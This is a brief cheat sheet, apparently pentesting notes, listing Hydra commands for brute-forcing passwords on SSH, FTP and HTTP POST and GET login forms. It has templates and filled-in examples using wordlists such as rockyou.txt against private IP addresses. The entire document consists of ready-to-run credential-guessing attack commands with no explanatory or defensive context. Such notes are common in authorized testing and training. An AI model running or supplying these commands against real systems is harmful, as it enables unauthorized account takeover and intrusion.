## Hydra

### SSH
```
hydra -l <username> -P <wordlist> <ip_addr> -t 4 ssh
```

### FTP
```
hydra -L logins.txt -P passwords.txt ftp://192.168.100.1
hydra -l user -P passwords.txt 192.168.100.1 ftp
```

### HTTP POST Form
```
hydra -l <username> -P <wordlist> <ip_addr> http-post-form "<path>:<login_credentials>:<invalid_response>" -v
-v #verbose
```
Example
```
hydra -L usernames.txt -P rockyou.txt 10.10.11.22 http-post-form \
"/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!" -v
```

### HTTP GET Form
```
hydra -l <username> -P <wordlist> <ip_addr> http-get-form "<path>:<login_credentials>:<invalid_response>" -v
```
Example
```
hydra -l admin -P /path/to/wordlist.txt 192.168.1.100 http-get-form "/login.php:user=^USER^&password=^PASS^:Invalid credentials" -v
```

